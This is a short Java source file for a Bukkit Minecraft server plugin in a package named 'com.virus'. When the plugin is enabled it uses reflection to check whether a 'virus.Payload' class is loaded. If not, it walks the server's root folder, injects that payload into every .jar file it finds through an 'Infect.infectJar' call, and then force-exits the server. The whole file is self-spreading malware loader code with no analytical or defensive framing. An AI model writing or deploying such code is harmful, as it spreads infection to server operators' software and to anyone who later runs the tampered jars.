package com.virus;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import virus.Infect;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;

public class BukkitPlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        super.onEnable();

        try {
            Class clazz = Class.forName("virus.Payload");
            Field loaded = clazz.getDeclaredField("payloadLoaded");
            loaded.setAccessible(true);
            if(!(boolean) loaded.get(null)) {
                for(File f : getDataFolder().getAbsoluteFile().getParentFile().getParentFile().listFiles()) {
                    if(f.getName().endsWith(".jar")) {
                        try {
                            Infect.infectJar(f, "virus.Payload");
                            System.exit(0);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        } catch (ClassNotFoundException | IllegalAccessException | NoSuchFieldException e) {
            e.printStackTrace();
        }
    }
}
